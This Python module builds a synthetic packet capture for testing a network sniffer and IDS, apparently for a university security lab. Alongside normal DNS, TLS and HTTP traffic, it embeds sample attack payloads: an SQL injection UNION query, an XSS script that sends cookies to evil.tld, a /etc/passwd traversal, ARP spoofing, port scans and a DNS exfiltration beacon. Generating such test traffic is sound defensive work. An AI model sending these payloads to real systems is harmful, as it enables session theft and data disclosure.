"""
WirePulse Realistic Multi-Protocol & Security-Incident PCAP Generator.

Constructs standards-compliant Ethernet/IPv4/IPv6/ARP/ICMP/TCP/UDP/HTTP/TLS/
DNS/DHCP/QUIC/SSH/FTP packets with valid IPv4 & TCP checksums so that:
  - Generated .pcap opens cleanly in upstream Wireshark too!
  - Exercises every WirePulse feature: OSI 7-layer dissection, DPI on non-standard
    ports, TCP stream reassembly with retransmission & sequence diagram, OS process
    attribution, and all Security IDS alert rules (ARP Spoof, SYN Port Scan, XMAS/NULL
    stealth scans, SQLi, XSS, Path Traversal, Cleartext HTTP Basic Auth & FTP creds,
    DNS Tunneling, Deprecated TLS 1.0 + weak cipher).
"""
from __future__ import annotations

import base64
import ipaddress
import os
import struct
import time
from typing import Dict, List, Tuple

from .pcap_io import DLT_EN10MB, RawPacket, write_pcap_file


def _checksum(data: bytes) -> int:
    if len(data) % 2 == 1:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _eth(src_mac: str, dst_mac: str, ethertype: int, payload: bytes) -> bytes:
    sm = bytes.fromhex(src_mac.replace(":", ""))
    dm = bytes.fromhex(dst_mac.replace(":", ""))
    return dm + sm + struct.pack("!H", ethertype) + payload


def _ipv4(src: str, dst: str, proto: int, payload: bytes, ttl: int = 64, ident: int = 0x1234) -> bytes:
    sb = ipaddress.IPv4Address(src).packed
    db = ipaddress.IPv4Address(dst).packed
    total_len = 20 + len(payload)
    hdr0 = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total_len, ident, 0x4000, ttl, proto, 0, sb, db)
    chk = _checksum(hdr0)
    hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total_len, ident, 0x4000, ttl, proto, chk, sb, db)
    return hdr + payload


def _tcp(
    src_ip: str, dst_ip: str, sport: int, dport: int, seq: int, ack: int, flags: int,
    payload: bytes = b"", window: int = 64240, options: bytes = b""
) -> bytes:
    pad = (4 - (len(options) % 4)) % 4
    opts = options + b"\x00" * pad
    doff = (20 + len(opts)) // 4
    off_flags = (doff << 12) | (flags & 0x1FF)
    hdr0 = struct.pack("!HHIIHHHH", sport, dport, seq & 0xFFFFFFFF, ack & 0xFFFFFFFF, off_flags, window, 0, 0) + opts
    seg = hdr0 + payload
    pseudo = ipaddress.IPv4Address(src_ip).packed + ipaddress.IPv4Address(dst_ip).packed + struct.pack("!BBH", 0, 6, len(seg))
    chk = _checksum(pseudo + seg)
    hdr = struct.pack("!HHIIHHHH", sport, dport, seq & 0xFFFFFFFF, ack & 0xFFFFFFFF, off_flags, window, chk, 0) + opts
    return hdr + payload


def _udp(sport: int, dport: int, payload: bytes) -> bytes:
    return struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload


def _icmp_echo(itype: int, ident: int, seq: int, payload: bytes = b"wirepulse-ping-test") -> bytes:
    body = struct.pack("!BBHHH", itype, 0, 0, ident, seq) + payload
    chk = _checksum(body)
    return struct.pack("!BBHHH", itype, 0, chk, ident, seq) + payload


def _arp(opcode: int, sha: str, spa: str, tha: str, tpa: str) -> bytes:
    return (
        struct.pack("!HHBBH", 1, 0x0800, 6, 4, opcode)
        + bytes.fromhex(sha.replace(":", ""))
        + ipaddress.IPv4Address(spa).packed
        + bytes.fromhex(tha.replace(":", ""))
        + ipaddress.IPv4Address(tpa).packed
    )


def _dns_name(name: str) -> bytes:
    out = b""
    for label in name.strip(".").split("."):
        b = label.encode("ascii")
        out += bytes([len(b)]) + b
    return out + b"\x00"


def _dns_query(txid: int, domain: str, qtype: int = 1) -> bytes:
    return struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0) + _dns_name(domain) + struct.pack("!HH", qtype, 1)


def _dns_response_a(txid: int, domain: str, ip_str: str, ttl: int = 300) -> bytes:
    q = _dns_name(domain) + struct.pack("!HH", 1, 1)
    ans = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, ttl, 4) + ipaddress.IPv4Address(ip_str).packed
    return struct.pack("!HHHHHH", txid, 0x8180, 1, 1, 0, 0) + q + ans


def _tls_client_hello(sni: str, version: int = 0x0303, ciphers: List[int] = None, tls13: bool = True) -> bytes:
    if ciphers is None:
        ciphers = [0x1301, 0x1302, 0x1303, 0xC02F, 0xC030, 0xCCA8]
    random_b = os.urandom(32)
    cs_bytes = b"".join(struct.pack("!H", c) for c in ciphers)
    # Extensions: SNI (0), Supported Groups (10), EC Point Formats (11), ALPN (16), Supported Versions (43)
    sni_b = sni.encode("ascii")
    sni_entry = b"\x00" + struct.pack("!H", len(sni_b)) + sni_b
    sni_ext_data = struct.pack("!H", len(sni_entry)) + sni_entry
    exts = struct.pack("!HH", 0, len(sni_ext_data)) + sni_ext_data
    # Supported groups: x25519 (29), secp256r1 (23)
    grp_data = struct.pack("!HHH", 4, 29, 23)
    exts += struct.pack("!HH", 10, len(grp_data)) + grp_data
    # EC point formats
    exts += struct.pack("!HHBB", 11, 2, 1, 0)
    # ALPN h2, http/1.1
    alpn_items = b"\x02h2\x08http/1.1"
    alpn_data = struct.pack("!H", len(alpn_items)) + alpn_items
    exts += struct.pack("!HH", 16, len(alpn_data)) + alpn_data
    if tls13:
        sv_data = struct.pack("!BHH", 4, 0x0304, 0x0303)
        exts += struct.pack("!HH", 43, len(sv_data)) + sv_data

    ch_body = (
        struct.pack("!H", version)
        + random_b
        + b"\x00"  # session_id len
        + struct.pack("!H", len(cs_bytes)) + cs_bytes
        + b"\x01\x00"  # compression methods
        + struct.pack("!H", len(exts)) + exts
    )
    hs = bytes([1]) + len(ch_body).to_bytes(3, "big") + ch_body
    rec = struct.pack("!BHH", 22, 0x0301, len(hs)) + hs
    return rec


def _tls_server_hello(version: int = 0x0303, cipher: int = 0x1301, tls13: bool = True) -> bytes:
    exts = struct.pack("!HH", 43, 2) + struct.pack("!H", 0x0304) if tls13 else b""
    sh_body = (
        struct.pack("!H", version)
        + os.urandom(32)
        + b"\x00"
        + struct.pack("!HB", cipher, 0)
        + (struct.pack("!H", len(exts)) + exts if exts else b"")
    )
    hs = bytes([2]) + len(sh_body).to_bytes(3, "big") + sh_body
    return struct.pack("!BHH", 22, version, len(hs)) + hs


def build_demo_dataset() -> Tuple[List[RawPacket], List[Tuple[str, int, str, int, int, str, str]]]:
    """
    Build a rich multi-protocol & security incident dataset.
    Returns (packets, process_overrides).
    """
    t0 = time.time() - 12.0
    t = t0
    pkts: List[RawPacket] = []
    procs: List[Tuple[str, int, str, int, int, str, str]] = []

    MAC_CLIENT = "a8:2b:dd:76:de:e9"
    MAC_GW = "00:e0:fc:12:34:56"
    MAC_SRV = "00:50:56:ab:cd:ef"
    MAC_ATTACKER = "08:00:27:de:ad:be"

    IP_CLIENT = "10.212.5.245"
    IP_GW = "10.212.0.1"
    IP_DNS = "223.5.5.5"
    IP_WEB = "10.212.8.80"
    IP_GITHUB = "140.82.114.4"
    IP_LEGACY = "10.212.8.99"
    IP_ATTACKER = "10.212.5.199"

    def push(frame: bytes, dt: float = 0.015) -> None:
        nonlocal t
        t += dt
        pkts.append(RawPacket(timestamp=t, caplen=len(frame), origlen=len(frame), linktype=DLT_EN10MB, data=frame))

    def push_tcp_frame(sm: str, dm: str, sip: str, dip: str, sp: int, dp: int, seq: int, ack: int, flags: int, payload: bytes = b"", win: int = 64240, opts: bytes = b"", dt: float = 0.012):
        seg = _tcp(sip, dip, sp, dp, seq, ack, flags, payload, window=win, options=opts)
        push(_eth(sm, dm, 0x0800, _ipv4(sip, dip, 6, seg)), dt=dt)

    # 1. Normal ARP resolution for gateway
    push(_eth(MAC_CLIENT, "ff:ff:ff:ff:ff:ff", 0x0806, _arp(1, MAC_CLIENT, IP_CLIENT, "00:00:00:00:00:00", IP_GW)), 0.01)
    push(_eth(MAC_GW, MAC_CLIENT, 0x0806, _arp(2, MAC_GW, IP_GW, MAC_CLIENT, IP_CLIENT)), 0.004)

    # 2. DHCP Request & ACK
    dhcp_req = struct.pack("!BBBB I HH 4s 4s 4s 4s", 1, 1, 6, 0, 0x5A3F1022, 0, 0, b"\x00"*4, b"\x00"*4, b"\x00"*4, b"\x00"*4)
    dhcp_req += bytes.fromhex(MAC_CLIENT.replace(":", "")) + b"\x00" * 10 + b"\x00" * 192
    dhcp_req += b"\x63\x82\x53\x63" + bytes([53, 1, 3, 12, 9]) + b"ucas-work" + bytes([50, 4]) + ipaddress.IPv4Address(IP_CLIENT).packed + b"\xff"
    push(_eth(MAC_CLIENT, "ff:ff:ff:ff:ff:ff", 0x0800, _ipv4("0.0.0.0", "255.255.255.255", 17, _udp(68, 67, dhcp_req))), 0.02)

    dhcp_ack = struct.pack("!BBBB I HH 4s 4s 4s 4s", 2, 1, 6, 0, 0x5A3F1022, 0, 0, b"\x00"*4, ipaddress.IPv4Address(IP_CLIENT).packed, ipaddress.IPv4Address(IP_GW).packed, b"\x00"*4)
    dhcp_ack += bytes.fromhex(MAC_CLIENT.replace(":", "")) + b"\x00" * 10 + b"\x00" * 192
    dhcp_ack += b"\x63\x82\x53\x63" + bytes([53, 1, 5, 51, 4]) + struct.pack("!I", 86400) + b"\xff"
    push(_eth(MAC_GW, MAC_CLIENT, 0x0800, _ipv4(IP_GW, IP_CLIENT, 17, _udp(67, 68, dhcp_ack))), 0.015)

    # 3. DNS Lookups (ucas.ac.cn & github.com)
    procs.append((IP_CLIENT, 53101, IP_DNS, 53, 4120, "chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"))
    push(_eth(MAC_CLIENT, MAC_GW, 0x0800, _ipv4(IP_CLIENT, IP_DNS, 17, _udp(53101, 53, _dns_query(0x4A11, "github.com", 1)))), 0.02)
    push(_eth(MAC_GW, MAC_CLIENT, 0x0800, _ipv4(IP_DNS, IP_CLIENT, 17, _udp(53, 53101, _dns_response_a(0x4A11, "github.com", IP_GITHUB)))), 0.018)
    push(_eth(MAC_CLIENT, MAC_GW, 0x0800, _ipv4(IP_CLIENT, IP_DNS, 17, _udp(53102, 53, _dns_query(0x4A12, "portal.ucas.ac.cn", 1)))), 0.015)
    push(_eth(MAC_GW, MAC_CLIENT, 0x0800, _ipv4(IP_DNS, IP_CLIENT, 17, _udp(53, 53102, _dns_response_a(0x4A12, "portal.ucas.ac.cn", IP_WEB)))), 0.016)

    # 4. TLS 1.3 Session to github.com (SNI + ALPN + JA3/JA3S) - chrome.exe
    procs.append((IP_CLIENT, 54200, IP_GITHUB, 443, 4120, "chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"))
    syn_opts = b"\x02\x04\x05\xb4\x04\x02\x01\x03\x03\x07"
    push_tcp_frame(MAC_CLIENT, MAC_GW, IP_CLIENT, IP_GITHUB, 54200, 443, 1000, 0, 0x002, opts=syn_opts, dt=0.02)
    push_tcp_frame(MAC_GW, MAC_CLIENT, IP_GITHUB, IP_CLIENT, 443, 54200, 5000, 1001, 0x012, opts=syn_opts, dt=0.028)
    push_tcp_frame(MAC_CLIENT, MAC_GW, IP_CLIENT, IP_GITHUB, 54200, 443, 1001, 5001, 0x010, dt=0.002)
    ch = _tls_client_hello("github.com", 0x0303, [0x1301, 0x1302, 0x1303, 0xC02F, 0xC030], tls13=True)
    push_tcp_frame(MAC_CLIENT, MAC_GW, IP_CLIENT, IP_GITHUB, 54200, 443, 1001, 5001, 0x018, ch, dt=0.005)
    sh = _tls_server_hello(0x0303, 0x1301, tls13=True)
    push_tcp_frame(MAC_GW, MAC_CLIENT, IP_GITHUB, IP_CLIENT, 443, 54200, 5001, 1001 + len(ch), 0x018, sh, dt=0.029)
    app_enc = struct.pack("!BHH", 23, 0x0303, 64) + os.urandom(64)
    push_tcp_frame(MAC_CLIENT, MAC_GW, IP_CLIENT, IP_GITHUB, 54200, 443, 1001 + len(ch), 5001 + len(sh), 0x018, app_enc, dt=0.01)
    push_tcp_frame(MAC_GW, MAC_CLIENT, IP_GITHUB, IP_CLIENT, 443, 54200, 5001 + len(sh), 1001 + len(ch) + len(app_enc), 0x018, app_enc, dt=0.025)

    # 5. HTTP/1.1 Conversation on Non-Standard Port 8888 (Demonstrates DPI + TCP Retransmission + Sequence Diagram)
    procs.append((IP_CLIENT, 55100, IP_WEB, 8888, 7824, "curl.exe", "curl -v http://portal.ucas.ac.cn:8888/api/v1/courses"))
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_WEB, 55100, 8888, 2000, 0, 0x002, opts=syn_opts, dt=0.03)
    push_tcp_frame(MAC_SRV, MAC_CLIENT, IP_WEB, IP_CLIENT, 8888, 55100, 8000, 2001, 0x012, opts=syn_opts, dt=0.014)
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_WEB, 55100, 8888, 2001, 8001, 0x010, dt=0.001)
    http_req1 = (
        b"GET /api/v1/courses?term=2026-fall HTTP/1.1\r\n"
        b"Host: portal.ucas.ac.cn:8888\r\n"
        b"User-Agent: curl/8.9.1 WirePulse-Lab\r\n"
        b"Accept: application/json\r\n\r\n"
    )
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_WEB, 55100, 8888, 2001, 8001, 0x018, http_req1, dt=0.004)
    http_resp1 = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: application/json; charset=utf-8\r\n"
        b"Server: nginx/1.26.2\r\n"
        b"Content-Length: 92\r\n\r\n"
        b'{"course":"Software and System Security","lab":"1A Sniffer","status":"ok","enrolled":131}\n'
    )
    push_tcp_frame(MAC_SRV, MAC_CLIENT, IP_WEB, IP_CLIENT, 8888, 55100, 8001, 2001 + len(http_req1), 0x018, http_resp1, dt=0.019)
    # Intentional TCP Retransmission of http_resp1 to demonstrate TCP Expert Analysis & Reassembly Deduplication!
    push_tcp_frame(MAC_SRV, MAC_CLIENT, IP_WEB, IP_CLIENT, 8888, 55100, 8001, 2001 + len(http_req1), 0x018, http_resp1, dt=0.045)
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_WEB, 55100, 8888, 2001 + len(http_req1), 8001 + len(http_resp1), 0x011, dt=0.006)
    push_tcp_frame(MAC_SRV, MAC_CLIENT, IP_WEB, IP_CLIENT, 8888, 55100, 8001 + len(http_resp1), 2002 + len(http_req1), 0x011, dt=0.009)
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_WEB, 55100, 8888, 2002 + len(http_req1), 8002 + len(http_resp1), 0x010, dt=0.002)

    # 6. Plaintext HTTP Basic Auth + Form Password Leak (CRITICAL + HIGH Security Alerts)
    procs.append((IP_CLIENT, 55210, IP_WEB, 80, 4120, "chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"))
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_WEB, 55210, 80, 3000, 0, 0x002, dt=0.03)
    push_tcp_frame(MAC_SRV, MAC_CLIENT, IP_WEB, IP_CLIENT, 80, 55210, 9000, 3001, 0x012, dt=0.011)
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_WEB, 55210, 80, 3001, 9001, 0x010, dt=0.002)
    b64_cred = base64.b64encode(b"admin:UCAS_Sec2026!").decode("ascii").encode("ascii")
    http_leak = (
        b"POST /admin/login HTTP/1.1\r\n"
        b"Host: intranet.ucas.local\r\n"
        b"Authorization: Basic " + b64_cred + b"\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
        b"username=admin&password=UCAS_Sec2026!&remember=1"
    )
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_WEB, 55210, 80, 3001, 9001, 0x018, http_leak, dt=0.008)
    http_ok = b"HTTP/1.1 200 OK\r\nSet-Cookie: JSESSIONID=98AB7721EF\r\nContent-Length: 18\r\n\r\n{\"login\":\"ok\"}\n"
    push_tcp_frame(MAC_SRV, MAC_CLIENT, IP_WEB, IP_CLIENT, 80, 55210, 9001, 3001 + len(http_leak), 0x018, http_ok, dt=0.015)

    # 7. Web Attack Stream: SQL Injection + XSS + Path Traversal (from attacker host)
    procs.append((IP_ATTACKER, 49152, IP_WEB, 80, 9312, "python3", "python3 exploit_scanner.py --target 10.212.8.80"))
    push_tcp_frame(MAC_ATTACKER, MAC_SRV, IP_ATTACKER, IP_WEB, 49152, 80, 4000, 0, 0x002, dt=0.04)
    push_tcp_frame(MAC_SRV, MAC_ATTACKER, IP_WEB, IP_ATTACKER, 80, 49152, 12000, 4001, 0x012, dt=0.008)
    sqli_req = (
        b"GET /api/users?id=1'%20OR%20'1'='1%20UNION%20SELECT%20user,passwd%20FROM%20sys_users-- HTTP/1.1\r\n"
        b"Host: portal.ucas.ac.cn\r\nUser-Agent: sqlmap/1.8\r\n\r\n"
    ).replace(b"%20", b" ")
    push_tcp_frame(MAC_ATTACKER, MAC_SRV, IP_ATTACKER, IP_WEB, 49152, 80, 4001, 12001, 0x018, sqli_req, dt=0.01)
    xss_req = (
        b"GET /search?q=<script>fetch('http://evil.tld/?c='+document.cookie)</script> HTTP/1.1\r\n"
        b"Host: portal.ucas.ac.cn\r\n\r\n"
    )
    push_tcp_frame(MAC_ATTACKER, MAC_SRV, IP_ATTACKER, IP_WEB, 49152, 80, 4001 + len(sqli_req), 12001, 0x018, xss_req, dt=0.012)
    trav_req = b"GET /static/../../../../etc/passwd HTTP/1.1\r\nHost: portal.ucas.ac.cn\r\n\r\n"
    push_tcp_frame(MAC_ATTACKER, MAC_SRV, IP_ATTACKER, IP_WEB, 49152, 80, 4001 + len(sqli_req) + len(xss_req), 12001, 0x018, trav_req, dt=0.012)
    push_tcp_frame(MAC_SRV, MAC_ATTACKER, IP_WEB, IP_ATTACKER, 80, 49152, 12001, 4001 + len(sqli_req) + len(xss_req) + len(trav_req), 0x014, dt=0.006)

    # 8. FTP Cleartext Credentials
    procs.append((IP_CLIENT, 56020, IP_LEGACY, 21, 6108, "ftp-client", "ftp 10.212.8.99"))
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_LEGACY, 56020, 21, 6000, 0, 0x002, dt=0.03)
    push_tcp_frame(MAC_SRV, MAC_CLIENT, IP_LEGACY, IP_CLIENT, 21, 56020, 15000, 6001, 0x012, dt=0.009)
    b1 = b"220 ProFTPD Legacy Server Ready\r\n"
    push_tcp_frame(MAC_SRV, MAC_CLIENT, IP_LEGACY, IP_CLIENT, 21, 56020, 15001, 6001, 0x018, b1, dt=0.005)
    u1 = b"USER deploy_ops\r\n"
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_LEGACY, 56020, 21, 6001, 15001 + len(b1), 0x018, u1, dt=0.012)
    p1 = b"PASS S3cr3tFtp2026!\r\n"
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_LEGACY, 56020, 21, 6001 + len(u1), 15001 + len(b1), 0x018, p1, dt=0.012)

    # 9. Deprecated TLS 1.0 + Weak RC4/3DES Cipher (Crypto Weakness Audit)
    procs.append((IP_CLIENT, 56400, IP_LEGACY, 8443, 6201, "legacy-sync.exe", "legacy-sync.exe --endpoint 10.212.8.99:8443"))
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_LEGACY, 56400, 8443, 7000, 0, 0x002, dt=0.02)
    push_tcp_frame(MAC_SRV, MAC_CLIENT, IP_LEGACY, IP_CLIENT, 8443, 56400, 17000, 7001, 0x012, dt=0.01)
    ch_weak = _tls_client_hello("legacy-db.ucas.local", 0x0301, [0x0005, 0x000A, 0x002F], tls13=False)
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_LEGACY, 56400, 8443, 7001, 17001, 0x018, ch_weak, dt=0.01)

    # 10. SSH Session Banner (non-standard port 2222 -> DPI test!)
    procs.append((IP_CLIENT, 57100, IP_WEB, 2222, 8840, "ssh", "ssh -p 2222 ops@10.212.8.80"))
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_WEB, 57100, 2222, 9000, 0, 0x002, dt=0.02)
    push_tcp_frame(MAC_SRV, MAC_CLIENT, IP_WEB, IP_CLIENT, 2222, 57100, 19000, 9001, 0x012, dt=0.008)
    push_tcp_frame(MAC_SRV, MAC_CLIENT, IP_WEB, IP_CLIENT, 2222, 57100, 19001, 9001, 0x018, b"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13\r\n", dt=0.006)
    push_tcp_frame(MAC_CLIENT, MAC_SRV, IP_CLIENT, IP_WEB, 57100, 2222, 9001, 19041, 0x018, b"SSH-2.0-OpenSSH_9.6p1 WirePulse\r\n", dt=0.007)

    # 11. QUIC RFC 9000 Initial + ICMP Ping + IPv6 ICMPv6
    procs.append((IP_CLIENT, 58001, "142.250.190.46", 443, 4120, "chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"))
    quic_init = bytes([0xC3]) + struct.pack("!I", 1) + bytes([8]) + bytes.fromhex("a1b2c3d4e5f60708") + bytes([0]) + os.urandom(48)
    push(_eth(MAC_CLIENT, MAC_GW, 0x0800, _ipv4(IP_CLIENT, "142.250.190.46", 17, _udp(58001, 443, quic_init))), 0.02)

    push(_eth(MAC_CLIENT, MAC_GW, 0x0800, _ipv4(IP_CLIENT, "223.5.5.5", 1, _icmp_echo(8, 0x1001, 1))), 0.015)
    push(_eth(MAC_GW, MAC_CLIENT, 0x0800, _ipv4("223.5.5.5", IP_CLIENT, 1, _icmp_echo(0, 0x1001, 1))), 0.011)

    # IPv6 Echo Request
    v6_src = ipaddress.IPv6Address("2400:dd01:103a:4062::10").packed
    v6_dst = ipaddress.IPv6Address("2400:3200::1").packed
    icmp6 = struct.pack("!BBHHH", 128, 0, 0x1234, 0x0042, 1) + b"ipv6-probe"
    ip6_hdr = struct.pack("!IHBB", 0x60000000, len(icmp6), 58, 64) + v6_src + v6_dst
    push(_eth(MAC_CLIENT, MAC_GW, 0x86DD, ip6_hdr + icmp6), 0.02)

    # 12. ARP Spoofing Attack! (Attacker hijacks Gateway IP 10.212.0.1 with rogue MAC)
    push(_eth(MAC_ATTACKER, MAC_CLIENT, 0x0806, _arp(2, MAC_ATTACKER, IP_GW, MAC_CLIENT, IP_CLIENT)), 0.025)

    # 13. TCP SYN Port Scan (12 ports) + XMAS & NULL Stealth Scans
    scan_ports = [21, 22, 23, 25, 80, 110, 139, 443, 445, 3306, 6379, 8080]
    for idx, port in enumerate(scan_ports):
        procs.append((IP_ATTACKER, 40000 + idx, IP_WEB, port, 9450, "nmap", "nmap -sS 10.212.8.80"))
        push_tcp_frame(MAC_ATTACKER, MAC_SRV, IP_ATTACKER, IP_WEB, 40000 + idx, port, 50000 + idx, 0, 0x002, dt=0.008)
        if port not in (22, 80):
            push_tcp_frame(MAC_SRV, MAC_ATTACKER, IP_WEB, IP_ATTACKER, port, 40000 + idx, 0, 50001 + idx, 0x014, dt=0.003)
    # XMAS Scan (FIN+PSH+URG = 0x29) & NULL Scan (0x00)
    push_tcp_frame(MAC_ATTACKER, MAC_SRV, IP_ATTACKER, IP_WEB, 40100, 8443, 60001, 0, 0x029, dt=0.01)
    push_tcp_frame(MAC_ATTACKER, MAC_SRV, IP_ATTACKER, IP_WEB, 40101, 9200, 60002, 0, 0x000, dt=0.01)

    # 14. DNS Tunneling Exfiltration (High-Entropy 38-char subdomain TXT query)
    procs.append((IP_CLIENT, 59901, IP_DNS, 53, 9912, "svchost_upd.exe", "C:\\Temp\\svchost_upd.exe --beacon"))
    tunnel_domain = "a9f4k2m8x7q3w5z1n6v0b4c8d2e9r7t1y3u5p8.exfil.c2-beacon.net"
    push(_eth(MAC_CLIENT, MAC_GW, 0x0800, _ipv4(IP_CLIENT, IP_DNS, 17, _udp(59901, 53, _dns_query(0x99F1, tunnel_domain, 16)))), 0.02)

    return pkts, procs


def ensure_sample_pcap(filepath: str) -> str:
    os.makedirs(os.path.dirname(filepath), exist_ok=True)
    pkts, _ = build_demo_dataset()
    write_pcap_file(filepath, pkts, linktype=DLT_EN10MB)
    return filepath
